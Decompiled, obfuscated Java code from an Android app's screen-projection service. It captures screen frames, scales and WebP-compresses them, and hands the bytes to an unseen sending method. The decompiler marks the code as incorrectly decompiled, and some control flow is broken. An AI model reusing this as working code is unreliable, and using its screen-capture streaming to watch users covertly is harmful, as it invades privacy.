package com.storm.safe.rock.service;

import android.graphics.Bitmap;
import android.graphics.Canvas;
import android.graphics.Paint;
import android.graphics.Rect;
import android.os.Build;
import com.storm.safe.rock.service.MediaDisplayService;
import java.io.ByteArrayOutputStream;
import java.util.ArrayList;
import java.util.concurrent.CancellationException;
import kotlin.coroutines.intrinsics.CoroutineSingletons;
import kotlin.coroutines.jvm.internal.SuspendLambda;
import p000.C0430dv;
import p000.C1351vv;
import p000.InterfaceC0876mv;
import p000.InterfaceC0920no;
import p000.InterfaceC1116qn;
import p000.kg1;
import p000.l10;
import p000.t60;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
@InterfaceC1116qn(m214402c = "com.storm.safe.rock.service.MediaDisplayService$ImageAvailableListener$onImageAvailable$3", m214403f = "MediaDisplayService.kt", m214404l = {}, m214405m = "invokeSuspend")
/* loaded from: classes2.dex */
final class MediaDisplayService$ImageAvailableListener$onImageAvailable$3 extends SuspendLambda implements l10 {

    /* renamed from: a1 */
    public final /* synthetic */ MediaDisplayService f52330a1;

    /* renamed from: a2 */
    public final /* synthetic */ Bitmap f52331a2;

    /* renamed from: a3 */
    public final /* synthetic */ int f52332a3;

    /* renamed from: a4 */
    public final /* synthetic */ int f52333a4;

    /* renamed from: a5 */
    public final /* synthetic */ int f52334a5;

    /* renamed from: a6 */
    public final /* synthetic */ float f52335a6;

    /* renamed from: a7 */
    public final /* synthetic */ int f52336a7;

    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
    public MediaDisplayService$ImageAvailableListener$onImageAvailable$3(MediaDisplayService mediaDisplayService, Bitmap bitmap, int i, int i2, int i3, float f, int i4, InterfaceC0876mv interfaceC0876mv) {
        super(2, interfaceC0876mv);
        this.f52330a1 = mediaDisplayService;
        this.f52331a2 = bitmap;
        this.f52332a3 = i;
        this.f52333a4 = i2;
        this.f52334a5 = i3;
        this.f52335a6 = f;
        this.f52336a7 = i4;
    }

    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    public final InterfaceC0876mv create(Object obj, InterfaceC0876mv interfaceC0876mv) {
        return new MediaDisplayService$ImageAvailableListener$onImageAvailable$3(this.f52330a1, this.f52331a2, this.f52332a3, this.f52333a4, this.f52334a5, this.f52335a6, this.f52336a7, interfaceC0876mv);
    }

    @Override // p000.l10
    public final Object invoke(Object obj, Object obj2) throws Throwable {
        MediaDisplayService$ImageAvailableListener$onImageAvailable$3 mediaDisplayService$ImageAvailableListener$onImageAvailable$3 = (MediaDisplayService$ImageAvailableListener$onImageAvailable$3) create((InterfaceC0920no) obj, (InterfaceC0876mv) obj2);
        C1351vv c1351vv = C1351vv.f60710b1;
        mediaDisplayService$ImageAvailableListener$onImageAvailable$3.invokeSuspend(c1351vv);
        return c1351vv;
    }

    /* JADX WARN: Removed duplicated region for block: B:83:0x0160 A[ADDED_TO_REGION] */
    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object invokeSuspend(Object obj) throws Throwable {
        Bitmap bitmap;
        Bitmap bitmap2;
        C1351vv c1351vv = C1351vv.f60710b1;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        kg1.m213544f4(obj);
        MediaDisplayService.C0279a0 c0279a0 = MediaDisplayService.f52303c1;
        try {
            if (!c0279a0.isProjecting() || this.f52330a1.f52322b3) {
                ArrayList arrayList = C0430dv.f55884a0;
                C0430dv.m212645a2(this.f52331a2);
            } else {
                if (this.f52331a2.isRecycled()) {
                    t60.m214726f4("ScreenProjectionSvc", "⚠️ [协程] bitmap 已被回收，跳过处理");
                    return c1351vv;
                }
                Bitmap bitmapM212643a0 = null;
                try {
                    try {
                        if (!c0279a0.isProjecting() || this.f52330a1.f52322b3 || this.f52331a2.isRecycled()) {
                            try {
                                ArrayList arrayList2 = C0430dv.f55884a0;
                                C0430dv.m212645a2(this.f52331a2);
                            } catch (Exception unused) {
                            }
                            try {
                                ArrayList arrayList3 = C0430dv.f55884a0;
                            } catch (Exception unused2) {
                            }
                            ArrayList arrayList4 = C0430dv.f55884a0;
                        } else {
                            int i = this.f52332a3;
                            int i2 = this.f52333a4;
                            Bitmap bitmapCreateBitmap = i != i2 ? Bitmap.createBitmap(this.f52331a2, 0, 0, i2, this.f52334a5) : this.f52331a2;
                            try {
                                float f = this.f52333a4;
                                float f2 = this.f52335a6;
                                int i3 = (int) (f * f2);
                                int i4 = (int) (this.f52334a5 * f2);
                                bitmapM212643a0 = C0430dv.m212643a0(i3, i4);
                                new Canvas(bitmapM212643a0).drawBitmap(bitmapCreateBitmap, new Rect(0, 0, bitmapCreateBitmap.getWidth(), bitmapCreateBitmap.getHeight()), new Rect(0, 0, i3, i4), new Paint(2));
                                ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
                                dqtvuisjd c0290a0 = dqtvuisjd.f52358m1.getInstance();
                                Bitmap bitmapM211387a0 = (c0290a0 == null || !c0290a0.f52469k0) ? bitmapM212643a0 : MediaDisplayService.m211387a0(this.f52330a1, bitmapM212643a0);
                                bitmapM211387a0.compress(Build.VERSION.SDK_INT >= 30 ? Bitmap.CompressFormat.WEBP_LOSSY : Bitmap.CompressFormat.WEBP, this.f52336a7, byteArrayOutputStream);
                                if (bitmapM211387a0 != bitmapM212643a0) {
                                    bitmapM211387a0.recycle();
                                }
                                byte[] byteArray = byteArrayOutputStream.toByteArray();
                                byteArrayOutputStream.close();
                                if (c0279a0.isProjecting() && !this.f52330a1.f52322b3) {
                                    this.f52330a1.f52324b5.incrementAndGet();
                                    MediaDisplayService mediaDisplayService = this.f52330a1;
                                    t60.m214694b5(byteArray, "frameData");
                                    MediaDisplayService.m211388a1(mediaDisplayService, byteArray);
                                    this.f52330a1.f52325b6.incrementAndGet();
                                }
                                try {
                                    if (!bitmapCreateBitmap.equals(this.f52331a2) && !bitmapCreateBitmap.isRecycled()) {
                                        bitmapCreateBitmap.recycle();
                                    }
                                } catch (Exception unused3) {
                                }
                                try {
                                    ArrayList arrayList5 = C0430dv.f55884a0;
                                    C0430dv.m212645a2(bitmapM212643a0);
                                } catch (Exception unused4) {
                                }
                                ArrayList arrayList6 = C0430dv.f55884a0;
                            } catch (CancellationException e) {
                                e = e;
                                bitmap2 = bitmapM212643a0;
                                bitmapM212643a0 = bitmapCreateBitmap;
                                try {
                                    throw e;
                                } catch (Throwable th) {
                                    th = th;
                                    bitmap = bitmap2;
                                    try {
                                        if (!t60.m214686a2(bitmapM212643a0, this.f52331a2)) {
                                            bitmapM212643a0.recycle();
                                        }
                                    } catch (Exception unused5) {
                                    }
                                    try {
                                        ArrayList arrayList7 = C0430dv.f55884a0;
                                        C0430dv.m212645a2(bitmap);
                                    } catch (Exception unused6) {
                                    }
                                    try {
                                        ArrayList arrayList8 = C0430dv.f55884a0;
                                        C0430dv.m212645a2(this.f52331a2);
                                        throw th;
                                    } catch (Exception unused7) {
                                        throw th;
                                    }
                                }
                            } catch (Exception e2) {
                                e = e2;
                                Bitmap bitmap3 = bitmapCreateBitmap;
                                bitmap = bitmapM212643a0;
                                bitmapM212643a0 = bitmap3;
                                try {
                                    t60.m214704c5("ScreenProjectionSvc", "❌ [图像] 后台处理失败: " + e.getMessage());
                                    try {
                                        if (!t60.m214686a2(bitmapM212643a0, this.f52331a2) && bitmapM212643a0 != null && !bitmapM212643a0.isRecycled()) {
                                            bitmapM212643a0.recycle();
                                        }
                                    } catch (Exception unused8) {
                                    }
                                    try {
                                        ArrayList arrayList9 = C0430dv.f55884a0;
                                        C0430dv.m212645a2(bitmap);
                                    } catch (Exception unused9) {
                                    }
                                    ArrayList arrayList10 = C0430dv.f55884a0;
                                    C0430dv.m212645a2(this.f52331a2);
                                    return c1351vv;
                                } catch (Throwable th2) {
                                    th = th2;
                                    if (!t60.m214686a2(bitmapM212643a0, this.f52331a2) && bitmapM212643a0 != null && !bitmapM212643a0.isRecycled()) {
                                        bitmapM212643a0.recycle();
                                    }
                                    ArrayList arrayList72 = C0430dv.f55884a0;
                                    C0430dv.m212645a2(bitmap);
                                    ArrayList arrayList82 = C0430dv.f55884a0;
                                    C0430dv.m212645a2(this.f52331a2);
                                    throw th;
                                }
                            } catch (Throwable th3) {
                                th = th3;
                                Bitmap bitmap4 = bitmapCreateBitmap;
                                bitmap = bitmapM212643a0;
                                bitmapM212643a0 = bitmap4;
                                if (!t60.m214686a2(bitmapM212643a0, this.f52331a2)) {
                                }
                                ArrayList arrayList722 = C0430dv.f55884a0;
                                C0430dv.m212645a2(bitmap);
                                ArrayList arrayList822 = C0430dv.f55884a0;
                                C0430dv.m212645a2(this.f52331a2);
                                throw th;
                            }
                        }
                    } catch (Throwable th4) {
                        th = th4;
                        bitmap = null;
                    }
                } catch (CancellationException e3) {
                    e = e3;
                    bitmap2 = null;
                } catch (Exception e4) {
                    e = e4;
                    bitmap = null;
                }
                C0430dv.m212645a2(this.f52331a2);
            }
        } catch (Exception unused10) {
        }
        return c1351vv;
    }
}
